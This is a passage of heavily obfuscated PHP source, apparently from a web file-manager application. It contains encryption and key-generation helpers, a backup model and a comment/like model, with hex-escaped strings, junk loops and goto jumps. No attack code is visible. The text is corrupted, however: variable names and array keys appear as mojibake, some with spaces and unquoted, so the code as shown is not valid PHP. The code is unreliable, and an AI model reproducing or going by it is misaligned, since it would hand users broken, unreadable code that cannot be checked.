ñ›õ, 16); $í¯œâ£ = $”õÚÚúµ[759]; while (strlen($í¯œâ£) < $”õÚÚúµ[669]) { if (!$í¯œâ£) { break; } $í¯œâ£++; } $öíøÉ‘„ = $ğƒœ“‚÷[296]; switch ($á¯Ê´É½) { case $ğƒœ“‚÷[205]: $¨İÙñÊœ = $this->hsox157bd8b4($•õ ñ›õ, strrev($ÒÊÇÓı¿ . $×©å¥)); break; case $ğƒœ“‚÷[122]: $¨İÙñÊœ = $this->hsox157bd8b4($•õ ñ›õ, strrev($×©å¥ . $ÒÊÇÓı¿)); $ø‰Ñ’¸ = $”õÚÚúµ[760]; while ($ø‰Ñ’¸ < $”õÚÚúµ[657]) { if ($ø‰Ñ’¸ >= 0) { break; } $ø‰Ñ’¸++; } break; case $ğƒœ“‚÷[297]: $¨İÙñÊœ = $this->hsox157bd8b4($•õ ñ›õ, base64_encode($×©å¥ . $ÒÊÇÓı¿)); $®¼Û¨À‰ = $”õÚÚúµ[761]; while ($®¼Û¨À‰ < $”õÚÚúµ[671]) { if ($®¼Û¨À‰ >= 0) { break; } $®¼Û¨À‰++; } break; $’¸õ÷°ƒ = $”õÚÚúµ[762]; if (strlen($’¸õ÷°ƒ) < $”õÚÚúµ[669]) { return; } case $ğƒœ“‚÷[298]: $¨İÙñÊœ = $this->hsox157bd8b4($•õ ñ›õ, md5($×©å¥ . $ÒÊÇÓı¿)); break; case $ğƒœ“‚÷[299]: $•õ ñ›õ = hash_decode($•õ ñ›õ); $ÂªşŸ›Ø = $”õÚÚúµ[763]; $êœ¨ÀªØ = $•õ ñ›õ[0]; $Ç¿¢©è = $”õÚÚúµ[764]; while ($Ç¿¢©è < $”õÚÚúµ[671]) { if ($Ç¿¢©è >= 0) { break; } $Ç¿¢©è++; } $•õ ñ›õ = substr($•õ ñ›õ, 1); $š‡ã§ù‘ = strpos($öíøÉ‘„, $êœ¨ÀªØ); $˜„È—¯ = $”õÚÚúµ[765]; if (strlen($˜„È—¯) < $”õÚÚúµ[671]) { return; } $¾Ûò‰¢Š = md5($êœ¨ÀªØ . md5($ÒÊÇÓı¿ . $êœ¨ÀªØ) . $ÒÊÇÓı¿); $¾Ûò‰¢Š = substr($¾Ûò‰¢Š, $š‡ã§ù‘ % 8, $š‡ã§ù‘ % 8 + 7); $ñäŒıè¯ = $ğƒœ“‚÷[6]; $­åªÁÒÖ = $”õÚÚúµ[766]; $Ö„±œí• = 0; $ÕÙòóú = 0; $„àó¤Œ’ = 0; $’åü¼…š = $”õÚÚúµ[767]; while ($’åü¼…š < $”õÚÚúµ[669]) { if ($’åü¼…š >= 0) { break; } $’åü¼…š++; } for ($Ö„±œí• = 0; $Ö„±œí• < strlen($•õ ñ›õ); $Ö„±œí•++) { $„àó¤Œ’ = $„àó¤Œ’ == strlen($¾Ûò‰¢Š) ? 0 : $„àó¤Œ’; $×Ãâ·´â = $„àó¤Œ’++; $ÕÙòóú = strpos($öíøÉ‘„, $•õ ñ›õ[$Ö„±œí•]) - $š‡ã§ù‘ - ord($¾Ûò‰¢Š[$×Ãâ·´â]); $‰¼ÔÜ  = $”õÚÚúµ[768]; if (!$‰¼ÔÜ ) { die; } while ($ÕÙòóú < 0) { $ÕÙòóú += 64; } $ñäŒıè¯ .= $öíøÉ‘„[$ÕÙòóú]; } $¨İÙñÊœ = base64_decode($ñäŒıè¯); break; default: $¨İÙñÊœ = $this->hsox157bd8b4($•õ ñ›õ, $ÒÊÇÓı¿ . $×©å¥); break; $’ˆÏ†ÛÇ = $”õÚÚúµ[769]; } if ($ŒŠÀ®¯£ - 1 > 0) { $¨İÙñÊœ = $this->gdyv9b19ed81($¨İÙñÊœ, $ÒÊÇÓı¿, $ŒŠÀ®¯£ - 1); } return $¨İÙñÊœ; } public function qxsv06505b9c($Ë¾û±í³) { $ñ™§õ£¯ =& $_SERVER[•Ùç É]; $¥èÉä©» =& $_SERVER[ÂÍ‘ñ¿ò]; $óĞÎˆÓï = $this->ghcd461c64f6(); $ÁÙ¹»ª = $this->ghcd461c64f6(); $­œğ×¼€ = ($óĞÎˆÓï - 1) * ($ÁÙ¹»ª - 1); $åƒ©Ê‹è = intval(($óĞÎˆÓï + $ÁÙ¹»ª) / 2); $²ÁÎ”™„ = $ñ™§õ£¯[770]; while (strlen($²ÁÎ”™„) < $ñ™§õ£¯[671]) { if (!$²ÁÎ”™„) { break; } $²ÁÎ”™„++; } while (1) { $çÆ ˜¼È = $åƒ©Ê‹è; $‹›ŒìØ” = $ñ™§õ£¯[771]; if (strlen($‹›ŒìØ”) < $ñ™§õ£¯[692]) { die; } $˜¯”ûìÇ = $­œğ×¼€; while ($˜¯”ûìÇ % $çÆ ˜¼È != 0) { $•çÑêÕ› = $˜¯”ûìÇ; $“Ã¶¨Ñî = $ñ™§õ£¯[772]; if (strlen($“Ã¶¨Ñî) < $ñ™§õ£¯[671]) { die; } $˜¯”ûìÇ = $çÆ ˜¼È; $¶¯ÅÙ„† = $ñ™§õ£¯[773]; while ($¶¯ÅÙ„† < $ñ™§õ£¯[692]) { if ($¶¯ÅÙ„† >= 0) { break; } $¶¯ÅÙ„†++; } $çÆ ˜¼È = $•çÑêÕ› % $çÆ ˜¼È; $®ˆÃÀØÑ = $ñ™§õ£¯[774]; if (strlen($®ˆÃÀØÑ) < $ñ™§õ£¯[661]) { return; } } if ($çÆ ˜¼È == 1) { break; } else { $åƒ©Ê‹è++; } } $·¡ö†¥• = 2; $âİûŸ£œ = $ñ™§õ£¯[775]; for ($ÓÁÎ°êÕ = 0; $ÓÁÎ°êÕ < $­œğ×¼€ * 10; $ÓÁÎ°êÕ++) { if (($­œğ×¼€ * $ÓÁÎ°êÕ + 1) % $åƒ©Ê‹è == 0) { $·¡ö†¥• = intval(($­œğ×¼€ * $ÓÁÎ°êÕ + 1) / $åƒ©Ê‹è); break; } } $ï¡ôˆî = $this->ehka110833eb($óĞÎˆÓï * $ÁÙ¹»ª . $¥èÉä©»[6], $¥èÉä©»[136]); $·Ï©•° = md5($¥èÉä©»[300] . ($óĞÎˆÓï + $ÁÙ¹»ª) . $¥èÉä©»[301] . $åƒ©Ê‹è . $¥èÉä©»[301] . $·¡ö†¥• . $¥èÉä©»[302]); $‚““÷“¥ = $ñ™§õ£¯[776]; while (strlen($‚““÷“¥) < $ñ™§õ£¯[692]) { if (!$‚““÷“¥) { break; } $‚““÷“¥++; } $½ “Èˆ = $this->ehka110833eb($Ë¾û±í³, $·Ï©•°) . $¥èÉä©»[303] . $ï¡ôˆî; $†˜ÀÊÅĞ = $ñ™§õ£¯[777]; return $½ “Èˆ; } public function xfad5fcc1643($¬¶ôË™’) { $Ó úæå± =& $_SERVER[•Ùç É]; $ÓÌ¸‡‰¿ =& $_SERVER[ÂÍ‘ñ¿ò]; $ö‰òáÛÂ = explode($ÓÌ¸‡‰¿[303], $¬¶ôË™’); $äâ†¤ˆ‹ = $Ó úæå±[778]; if (strlen($äâ†¤ˆ‹) < $Ó úæå±[669]) { return; } if (count($ö‰òáÛÂ) != 2) { return $ÓÌ¸‡‰¿[6]; } $ÄÌŠÙ¿ = $this->hsox157bd8b4($ö‰òáÛÂ[1] . $ÓÌ¸‡‰¿[6], $ÓÌ¸‡‰¿[136]); if (!$ÄÌŠÙ¿) { return $ÓÌ¸‡‰¿[6]; } $ÄÌŠÙ¿ = intval($ÄÌŠÙ¿); $òê“¤Ë£ = 0; $¥ç‚Ü×û = 0; $îœÚéîÕ = $Ó úæå±[779]; for ($Å¬ô¡š = 3; $Å¬ô¡š < $ÄÌŠÙ¿; $Å¬ô¡š += 2) { if ($ÄÌŠÙ¿ % $Å¬ô¡š != 0) { continue; } $òê“¤Ë£ = $Å¬ô¡š; $Õ¤æ—ºµ = $Ó úæå±[780]; $¥ç‚Ü×û = intval($ÄÌŠÙ¿ / $Å¬ô¡š); break; } $Ñˆü”“– = ($òê“¤Ë£ - 1) * ($¥ç‚Ü×û - 1); $¯Ò¾©î = $Ó úæå±[781]; if (strlen($¯Ò¾©î) < $Ó úæå±[692]) { return; } $¬§ÄÉø = intval(($òê“¤Ë£ + $¥ç‚Ü×û) / 2); $ğ¶È‹œ = $Ó úæå±[699]; if (!$ğ¶È‹œ) { return; } while (1) { $ß¹Å  = $¬§ÄÉø; $–‘·ç˜ƒ = $Ñˆü”“–; $¬ÊÁÎÕ® = $Ó úæå±[782]; while ($–‘·ç˜ƒ % $ß¹Å  != 0) { $‰ö•»ñ½ = $–‘·ç˜ƒ; $è¦Áã³± = $Ó úæå±[783]; if (strlen($è¦Áã³±) < $Ó úæå±[692]) { die; } $–‘·ç˜ƒ = $ß¹Å ; $ß¹Å  = $‰ö•»ñ½ % $ß¹Å ; } if ($ß¹Å  == 1) { break; } else { $¬§ÄÉø++; } } $œì¤‡Â„ = 2; for ($Å¬ô¡š = 0; $Å¬ô¡š < $Ñˆü”“– * 10; $Å¬ô¡š++) { if (($Ñˆü”“– * $Å¬ô¡š + 1) % $¬§ÄÉø == 0) { $œì¤‡Â„ = intval(($Ñˆü”“– * $Å¬ô¡š + 1) / $¬§ÄÉø); break; } } $ó„ÛŞñ = md5($ÓÌ¸‡‰¿[300] . ($òê“¤Ë£ + $¥ç‚Ü×û) . $ÓÌ¸‡‰¿[301] . $¬§ÄÉø . $ÓÌ¸‡‰¿[301] . $œì¤‡Â„ . $ÓÌ¸‡‰¿[302]); $‚â‡íê = $Ó úæå±[784]; while (strlen($‚â‡íê) < $Ó úæå±[671]) { if (!$‚â‡íê) { break; } $‚â‡íê++; } $è¿µÛñÆ = $this->hsox157bd8b4($ö‰òáÛÂ[0], $ó„ÛŞñ); return $è¿µÛñÆ; } public function ghcd461c64f6() { $¯ĞûèÍ× =& $_SERVER[•Ùç É]; $ÀøÕÊ•ª = mt_rand(pow(2, 14), pow(2, 16) - 1); $áşÚâÒÀ = $¯ĞûèÍ×[785]; while (strlen($áşÚâÒÀ) < $¯ĞûèÍ×[692]) { if (!$áşÚâÒÀ) { break; } $áşÚâÒÀ++; } $“£âÊğû = array(); $ÖËŞ»üÉ = $¯ĞûèÍ×[786]; while ($ÖËŞ»üÉ < $¯ĞûèÍ×[692]) { if ($ÖËŞ»üÉ >= 0) { break; } $ÖËŞ»üÉ++; } $ñ°Ûİ´Ğ = 1; $³ÓĞæşå = $¯ĞûèÍ×[787]; while ($ñ°Ûİ´Ğ <= (int) sqrt($ÀøÕÊ•ª)) { $ôú¤²¯ü = $ñ°Ûİ´Ğ; $ÉöõÄ‚ = $¯ĞûèÍ×[788]; while (!0) { $ôú¤²¯ü++; $—¢¨Îõ = $¯ĞûèÍ×[789]; if (strlen($—¢¨Îõ) < $¯ĞûèÍ×[669]) { die; } if ($ôú¤²¯ü <= 2) { $ñ°Ûİ´Ğ = $ôú¤²¯ü; break; } else { if ($ôú¤²¯ü < 2) { continue; } } $À­Ø² = !0; for ($Áœ¯ó€‘ = 2; $Áœ¯ó€‘ <= sqrt($ôú¤²¯ü); $Áœ¯ó€‘++) { if ($ôú¤²¯ü % $Áœ¯ó€‘ == 0) { $À­Ø² = !1; } } if ($À­Ø²) { $ñ°Ûİ´Ğ = $ôú¤²¯ü; break; } } $“£âÊğû[] = $ñ°Ûİ´Ğ; } $çøùÓ¿ˆ = 2; for ($ôú¤²¯ü = $ÀøÕÊ•ª; $ôú¤²¯ü > 1; $ôú¤²¯ü--) { $À­Ø² = !0; foreach ($“£âÊğû as $ú”ª¸¤Ô) { if ($ôú¤²¯ü % $ú”ª¸¤Ô == 0) { $À­Ø² = !1; break; } } if ($À­Ø²) { $çøùÓ¿ˆ = $ôú¤²¯ü; break; } } return $çøùÓ¿ˆ; $·ñòÀå = $¯ĞûèÍ×[790]; if (!$·ñòÀå) { die; } } public function cxrff5f5dc5f($² ê”Ò, $°ˆ—š­š) { $ˆ¯Ë…é£ =& $_SERVER[•Ùç É]; $½“ò…Ø =& $_SERVER[ÂÍ‘ñ¿ò]; return call_user_func(array($½“ò…Ø[8], $½“ò…Ø[304]), $² ê”Ò, $°ˆ—š­š); $·‘¬ÚÊÉ = $ˆ¯Ë…é£[791]; if (strlen($·‘¬ÚÊÉ) < $ˆ¯Ë…é£[661]) { die; } } public function ehka110833eb($¾Ïî” ¡, $Â•ªÉ‚¨) { $ùÜ‰õ  =& $_SERVER[ÂÍ‘ñ¿ò]; return call_user_func(array($ùÜ‰õ [305], $ùÜ‰õ [306]), $¾Ïî” ¡, $Â•ªÉ‚¨); } public function hsox157bd8b4($«šà•˜è, $Ô·…‘´õ) { $µé£İä =& $_SERVER[ÂÍ‘ñ¿ò]; return call_user_func(array($µé£İä[305], $µé£İä[307]), $«šà•˜è, $Ô·…‘´õ); $â×âÓ‘È = $_SERVER[•Ùç É][792]; } } goto bÓÀöÖô ; cƒ…ò¶Î„¸: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x62\141\x63\153\165\160\114\x69\x73\164"; public $field = array("\x69\157", "\x6e\x61\x6d\145", "\x73\x74\141\164\x75\163", "\143\x6f\x6e\164\x65\156\164", "\155\x61\156\x75\141\x6c", "\162\x65\163\x75\154\x74", "\x74\151\155\145\106\x72\x6f\155", "\x74\151\155\x65\124\x6f"); public function config() { $ÇÌÌãø =& $_SERVER[•Ùç É]; $ÅØæÈª› = Model($ÇÌÌãø[815])->get($ÇÌÌãø[825]); $ÅØæÈª› = json_decode($ÅØæÈª›, !0); $ÅØæÈª› = is_array($ÅØæÈª›) ? $ÅØæÈª› : array(); if (!isset($ÅØæÈª›[$ÇÌÌãø[799]])) { $ÅØæÈª›[$ÇÌÌãø[799]] = $ÇÌÌãø[90]; } unset($ÅØæÈª›[$ÇÌÌãø[1675]]); Action($ÇÌÌãø[1929])->taskInit(); Model($ÇÌÌãø[1674])->cacheClear(); $“îÉ€¾Ñ = $ÇÌÌãø[1930]; $ŞÁë¸¾Å = Model($ÇÌÌãø[1931])->findByKey($ÇÌÌãø[1693], $“îÉ€¾Ñ); if (!$ŞÁë¸¾Å) { $ŞÁë¸¾Å = array(); } if (isset($ŞÁë¸¾Å[$ÇÌÌãø[196]])) { $ŞÁë¸¾Å[$ÇÌÌãø[196]] = json_decode($ŞÁë¸¾Å[$ÇÌÌãø[196]], !0); } if (isset($ÅØæÈª›[$ÇÌÌãø[196]])) { $ŞÁë¸¾Å[$ÇÌÌãø[196]][$ÇÌÌãø[1678]] = $ÅØæÈª›[$ÇÌÌãø[196]]; unset($ÅØæÈª›[$ÇÌÌãø[196]]); } return array_merge($ŞÁë¸¾Å, $ÅØæÈª›); } public function listData($²åµ†«ş = false, $ÁÕÙ•ãˆ = "\155\157\x64\x69\146\x79\124\x69\155\x65", $µ„Ï¡í = false) { return parent::listData($²åµ†«ş, $ÁÕÙ•ãˆ, !0); } public function lastItem() { $ƒÕÌ¿¦ = $this->listData(); return !empty($ƒÕÌ¿¦[0]) ? $ƒÕÌ¿¦[0] : null; } public function kill($­üö§…×) { $ã³üŞ³³ =& $_SERVER[•Ùç É]; $öŠòµù = $this->listData($­üö§…×); if (!$öŠòµù || empty($öŠòµù[$ã³üŞ³³[32]])) { return !0; } Task::kill($ã³üŞ³³[824]); Task::kill($ã³üŞ³³[845]); Task::kill($ã³üŞ³³[854]); $©¾ÇÜÌô = $öŠòµù[$ã³üŞ³³[32]]; $®œ‹–Ã‡ = TEMP_FILES . $ã³üŞ³³[823] . $©¾ÇÜÌô . $ã³üŞ³³[8]; IO::remove($®œ‹–Ã‡, !1); return $this->remove($­üö§…×); } public function remove($®»¡¥·Ó) { $”ı¿È™ = $this->listData($®»¡¥·Ó); if (!$”ı¿È™) { return !0; } return $this->backupRemove($”ı¿È™); } private function backupRemove($Ş÷–‰‘—) { parent::remove($Ş÷–‰‘—[$_SERVER[•Ùç É][445]]); $€Ç¨–ÓÕ = $this->backupPath($Ş÷–‰‘—); IO::remove($€Ç¨–ÓÕ, !1); return !0; } private function backupPath($ª´¿™•) { $å³ÈÑËï =& $_SERVER[•Ùç É]; $†­±¢¬° = $ª´¿™•[$å³ÈÑËï[32]]; $ĞÎÃÜ´Ø = Model($å³ÈÑËï[815])->get($å³ÈÑËï[816]); $ÑÓ·ªŞ³ = substr(md5($å³ÈÑËï[817] . $ĞÎÃÜ´Ø . $†­±¢¬°), 0, 8); return "\x7b\x69\x6f\x3a{$ª´¿™•[$å³ÈÑËï[796]]}\175\57\x64\x61\x74\141\x62\141\x73\x65\57\x62\141\143\x6b\x75\160\57" . $†­±¢¬° . $å³ÈÑËï[11] . $ÑÓ·ªŞ³; } public function start() { $éÀ•Â¦ =& $_SERVER[•Ùç É]; if ($GLOBALS[$éÀ•Â¦[6]][$éÀ•Â¦[91]][$éÀ•Â¦[1932]] != $éÀ•Â¦[90]) { return !0; } $Ğú¸ä°Ÿ = $this->config(); if (!$Ğú¸ä°Ÿ || $Ğú¸ä°Ÿ[$éÀ•Â¦[1675]] != $éÀ•Â¦[90]) { return !1; } $ëòçÅõÓ = $this->process(); foreach ($ëòçÅõÓ as $ÊÄµìï×) { if ($ÊÄµìï×) { return Task::restart($ÊÄµìï×[$éÀ•Â¦[445]]); } } $ì¾©ÏÊØ = new Backup(); $ĞÉ±Ö§Á = $ì¾©ÏÊØ->db(); if ($ĞÉ±Ö§Á) { $ĞÉ±Ö§Á = $ì¾©ÏÊØ->dbFile(); if ($ĞÉ±Ö§Á && $Ğú¸ä°Ÿ[$éÀ•Â¦[799]] == $éÀ•Â¦[214]) { $ĞÉ±Ö§Á = $ì¾©ÏÊØ->file(); } } Backup::set(array($éÀ•Â¦[795] => 1, $éÀ•Â¦[806] => time())); return !0; } public function process() { $ã¥Õ¨äâ =& $_SERVER[•Ùç É]; $üªíùŞê = array($ã¥Õ¨äâ[802] => Task::get($ã¥Õ¨äâ[824]), $ã¥Õ¨äâ[807] => Task::get($ã¥Õ¨äâ[845]), $ã¥Õ¨äâ[216] => Task::get($ã¥Õ¨äâ[854])); $ïÓÎ”› = !1; foreach ($üªíùŞê as &$Å“ÒÜ¯—) { if ($ïÓÎ”›) { $Å“ÒÜ¯— = !1; continue; } if ($Å“ÒÜ¯—) { $ğÀŒ³Î = intval(_get($Å“ÒÜ¯—, $ã¥Õ¨äâ[1710], 0)); if (time() - $ğÀŒ³Î > 7200) { Task::kill($Å“ÒÜ¯—[$ã¥Õ¨äâ[445]]); $ïÓÎ”› = !0; $Å“ÒÜ¯— = !1; } } } return $üªíùŞê; } public function restore() { $ê§’Ãñ• =& $_SERVER[•Ùç É]; ActionCall($ê§’Ãñ•[1111], !0, 1); ActionCall($ê§’Ãñ•[1111], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\156\164"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\155\x65" => "\143\x6f\155\155\145\156\x74\137\155\x65\164\141", "\x6d\145\164\141\x46\x69\x65\x6c\x64" => "\143\x6f\155\155\x65\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ƒ˜áÌ‹ñ) { $ë†–úÜ» =& $_SERVER[•Ùç É]; if ($ƒ˜áÌ‹ñ[$ë†–úÜ»[1933]]) { $ƒÈ•ÊÙ¹ = $this->where(array($ë†–úÜ»[1934] => $ƒ˜áÌ‹ñ[$ë†–úÜ»[1933]]))->find(); if (!$ƒÈ•ÊÙ¹ || $ƒÈ•ÊÙ¹[$ë†–úÜ»[180]] != $ƒ˜áÌ‹ñ[$ë†–úÜ»[180]] || $ƒÈ•ÊÙ¹[$ë†–úÜ»[540]] != $ƒ˜áÌ‹ñ[$ë†–úÜ»[540]]) { return !1; } $this->where(array($ë†–úÜ»[1934] => $ƒ˜áÌ‹ñ[$ë†–úÜ»[1933]]))->setAdd($ë†–úÜ»[1935], 1); } $ƒ˜áÌ‹ñ[$ë†–úÜ»[1936]] = 0; $ƒ˜áÌ‹ñ[$ë†–úÜ»[1935]] = 0; $ƒ˜áÌ‹ñ[$ë†–úÜ»[795]] = 1; return $this->add($ƒ˜áÌ‹ñ); } public function commentCount($¥îÀµÇò, $õ°üêûÃ, $«¡ÃÃ›ø = false) { $¶ç«¹–‚ =& $_SERVER[•Ùç É]; if (!$¥îÀµÇò) { return array(); } if (is_string($¥îÀµÇò) || is_int($¥îÀµÇò)) { $¥îÀµÇò = array($¥îÀµÇò); } $Ìà˜Ã = array($¶ç«¹–‚[540], $¶ç«¹–‚[1937] => $¶ç«¹–‚[536]); $íÚÓ­®— = array($¶ç«¹–‚[540] => array($¶ç«¹–‚[7], $¥îÀµÇò), $¶ç«¹–‚[180] => $õ°üêûÃ); if ($«¡ÃÃ›ø) { $íÚÓ­®—[$¶ç«¹–‚[1705]] = $«¡ÃÃ›ø; } $·«ËÍğ® = $this->field($Ìà˜Ã)->where($íÚÓ­®—)->group($¶ç«¹–‚[540])->select(); return array_to_keyvalue($·«ËÍğ®, $¶ç«¹–‚[540], $¶ç«¹–‚[536]); } public function starTarget($‘»¤‚Ñæ, $½šÌÃëØ) { $ïòÜñ»ò =& $_SERVER[•Ùç É]; $ß¼á¼È„ = $‘»¤‚Ñæ + self::TYPE_STAR_OFFSET; $şãˆ…ç = array($ïòÜñ»ò[1705] => USER_ID, $ïòÜñ»ò[180] => $ß¼á¼È„, $ïòÜñ»ò[540] => $½šÌÃëØ); $óÉÒŸÈú = $this->where($şãˆ…ç)->find(); if ($óÉÒŸÈú) { return $this->where(array($ïòÜñ»ò[445] => $óÉÒŸÈú[$ïòÜñ»ò[445]]))->delete(); } $¤ûş¸šš = array($ïòÜñ»ò[1933] => 0, $ïòÜñ»ò[1705] => USER_ID, $ïòÜñ»ò[795] => 1, $ïòÜñ»ò[799] => $ïòÜñ»ò[12], $ïòÜñ»ò[180] => $ß¼á¼È„, $ïòÜñ»ò[540] => $½šÌÃëØ, $ïòÜñ»ò[1936] => 0, $ïòÜñ»ò[1935] => 0); return $this->add($¤ûş¸šš); } public function starTargetCount($ñÆ‘€¯€, $ÂÈ”Óú®) { $™òò©ö¡ =& $_SERVER[•Ùç É]; $£“Ğúøœ = $ÂÈ”Óú® + self::TYPE_STAR_OFFSET; $éŒ¯£ = $this->commentCount($ñÆ‘€¯€, $£“Ğúøœ); $ã×¼¡í = $this->commentCount($ñÆ‘€¯€, $£“Ğúøœ, USER_ID); return array($™òò©ö¡[1938] => $éŒ¯£, $™òò©ö¡[1939] => $ã×¼¡í); } public function starTargetUserList($şˆûïôÉ, $£¯ıíêä) { $³òØ¤÷ =& $_SERVER[•Ùç É]; $›¼‹­«° = $şˆûïôÉ + self::TYPE_STAR_OFFSET; $Õ–¯ëä = array($³òØ¤÷[540] => $£¯ıíêä, $³òØ¤÷[180] => $›¼‹­«°); $µ„å¸Òë = $this->where($Õ–¯ëä)->count(); $ù¹±í“İ = array($³òØ¤÷[301] => $µ„å¸Òë, $³òØ¤÷[1940] => array()); if (!$µ„å¸Òë) { return $ù¹±í“İ; } $äîÂÌôÑ = $this->field($³òØ¤÷[1705])->where($Õ–¯ëä)->limit(500)->select(); $äîÂÌôÑ = array_to_keyvalue($äîÂÌôÑ, $³òØ¤÷[12], $³òØ¤÷[1705]); $ù¹±í“İ[$³òØ¤÷[1940]] = Model($³òØ¤÷[548])->userListInfo($äîÂÌôÑ); return $ù¹±í“İ; } public function prasiseUserList($«ÔûÄœî) { $¥¡öˆ§¦ =& $_SERVER[•Ùç É]; $ƒë¹ı  = array($¥¡öˆ§¦[1941] => $«ÔûÄœî); $œ¨¨ÍÈ = $this->where($ƒë¹ı )->find(); $©—™¬÷ = _get($œ¨¨ÍÈ, $¥¡öˆ§¦[1936], 0); $ÑÊï·‹˜ = array($¥¡öˆ§¦[301] => $©—™¬÷, $¥¡öˆ§¦[1940] => array()); if (!$©—™¬÷) { return $ÑÊï·‹˜; } $ŞƒÁÜï = Model($¥¡öˆ§¦[1942])->field($¥¡öˆ§¦[1705])->where($ƒë¹ı )->limit(500)->select(); $ŞƒÁÜï = array_to_keyvalue($ŞƒÁÜï, $¥¡öˆ§¦[12], $¥¡öˆ§¦[1705]); $ÑÊï·‹˜[$¥¡öˆ§¦[1940]] = Model($¥¡öˆ§¦[548])->userListInfo($ŞƒÁÜï); return $ÑÊï·‹˜; } public function remove($‰¹¡áíª) { $İ ÉîÔÍ =& $_SERVER[•Ùç É]; $ÒîÊÍ¡ = array($İ ÉîÔÍ[1934] => $‰¹¡áíª); $…³€óÌŞ = $this->where($ÒîÊÍ¡)->find(); if ($…³€óÌŞ[$İ ÉîÔÍ[1933]]) { $this->where(array($İ ÉîÔÍ[1934] => $…³€óÌŞ[$İ ÉîÔÍ[1933]]))->setAdd($İ ÉîÔÍ[1935], -1); } return $this->where($ÒîÊÍ¡)->delete(); } public function edit($®ø½úĞÊ, $ù‹­¦•…) { $êğ¿Æ«´ =& $_SERVER[•Ùç É]; $—È°ò› = array($êğ¿Æ«´[1934] => $®ø½úĞÊ); return $this->where($—È°ò›)->save(array($êğ¿Æ«´[1943] => $ù‹­¦•…)); } public function prasise($¦º”ÈØ) { $Ôêèø“ğ =& $_SERVER[•Ùç É]; $¢…©€‘’ = Model($Ôêèø“ğ[1944]); $á½µùã = array($Ôêèø“ğ[1934] => $¦º”ÈØ, $Ôêèø“ğ[1696] => USER_ID); $Î½É°ù­ = $¢…©€‘’->where($á½µùã)->find(); if (!$Î½É°ù­) { $¢…©€‘’->add($á½µùã); $¤–ÛµœÈ = $this->where(array($Ôêèø“ğ[1934] => $¦º”ÈØ))->setAdd($Ôêèø“ğ[1936], 1); } else { $¢…©€‘’->where($á½µùã)->delete(); $¤–ÛµœÈ = $this->where(array($Ôêèø“ğ[1934] => $¦º”ÈØ))->setAdd($Ôêèø“ğ[1936], -1); } return $¤–ÛµœÈ; } public function targetInfo($Ú‹™ıØÉ, $È¡½©ö‡) { $ñ¼„™Ê¯ =& $_SERVER[•Ùç É]; $´÷¥€í£ = array($ñ¼„™Ê¯[618] => $Ú‹™ıØÉ, $ñ¼„™Ê¯[619] => $È¡½©ö‡); $€ÑÔ‹–¤ = $this->where($´÷¥€í£)->count(); $¹·¿±¹£ = "\x52\111\x47\x48\x54\40\112\117\111\x4e\x20{$this->tablePrefix}\143\x6f\155\155\145\x6e\164\x5f\x70\162\141\151\x73\x65\40\x73\x74\x61\x72\x20\x6f\x6e\40\143\157\x6d\x6d\x65\156\x74\x2e\x63\x6f\x6d\x6d\145\x6e\x74\x49\x44\40\x3d\40\163\x74\141\x72\x2e\x63\x6f\x6d\x6d\145\156\x74\x49\x44"; $ãğéæ×„ = $this->alias($ñ¼„™Ê¯[400])->where($´÷¥€í£)->join($¹·¿±¹£, $ñ¼„™Ê¯[1945])->count(); $¼ÎÂøÉ = array($ñ¼„™Ê¯[1946] => $€ÑÔ‹–¤, $ñ¼„™Ê¯[1947] => $ãğéæ×„); return $¼ÎÂøÉ; } public function listData($×Ìİ»ô¡) { $˜õĞæÌş =& $_SERVER[•Ùç É]; if (isset($×Ìİ»ô¡[$˜õĞæÌş[1948]])) { if ($×Ìİ»ô¡[$˜õĞæÌş[1948]]) { $×Ìİ»ô¡[$˜õĞæÌş[1941]] = array($˜õĞæÌş[1065], intval($×Ìİ»ô¡[$˜õĞæÌş[1948]])); } unset($×Ìİ»ô¡[$˜õĞæÌş[1948]]); } if (isset($×Ìİ»ô¡[$˜õĞæÌş[1949]])) { if ($×Ìİ»ô¡[$˜õĞæÌş[1949]]) { $×Ìİ»ô¡[$˜õĞæÌş[1941]] = array($˜õĞæÌş[1062], intval($×Ìİ»ô¡[$˜õĞæÌş[1949]])); } unset($×Ìİ»ô¡[$˜õĞæÌş[1949]]); } return $this->_listData($×Ìİ»ô¡); } private function _listData($–’ŸĞ) { $äÔƒˆÓ÷ =& $_SERVER[•Ùç É]; $éÅÅÇ¢ú = $this->where($–’ŸĞ)->_makeOrder()->selectPage(100); $this->_listAppendParent($éÅÅÇ¢ú[$äÔƒˆÓ÷[415]]); $this->_listAppendUser($éÅÅÇ¢ú[$äÔƒˆÓ÷[415]]); $this->_listAppendMeta($éÅÅÇ¢ú[$äÔƒˆÓ÷[415]]); return $éÅÅÇ¢ú; } private function _makeOrder() { $ÅòÕ® =& $_SERVER[•Ùç É]; $ïœõí = array($ÅòÕ®[1936], $ÅòÕ®[1935], $ÅòÕ®[217]); $òùƒ˜¥ş = Input::get($ÅòÕ®[500], $ÅòÕ®[7], $ÅòÕ®[467], $ïœõí); $±¾áœÉ = Input::get($ÅòÕ®[501], $ÅòÕ®[7], $ÅòÕ®[1698], array($ÅòÕ®[1950], $ÅòÕ®[496])); $ÒúëÍ¯Ò = $òùƒ˜¥ş . $ÅòÕ®[53] . $±¾áœÉ; return $this->order($ÒúëÍ¯Ò); } private function _listAppendParent(&$Ş‰¹Š¿ä) { $½ì¥ùÍ =& $_SERVER[•Ùç É]; $õ´»äÛ– = array_unique(array_to_keyvalue($Ş‰¹Š¿ä, $½ì¥ùÍ[12], $½ì¥ùÍ[1933])); $õ´»äÛ– = array_remove_value($õ´»äÛ–, $½ì¥ùÍ[214]); if (!$õ´»äÛ–) { return; } $ç­Û‚ = $this->where(array($½ì¥ùÍ[1934] => array($½ì¥ùÍ[7], $õ´»äÛ–)))->select(); $ç­Û‚ = array_to_keyvalue($ç­Û‚, $½ì¥ùÍ[1941]); foreach ($Ş‰¹Š¿ä as &$ ›½ŠÃ) { if (isset($ç­Û‚[$ ›½ŠÃ[$½ì¥ùÍ[1933]]])) { $ 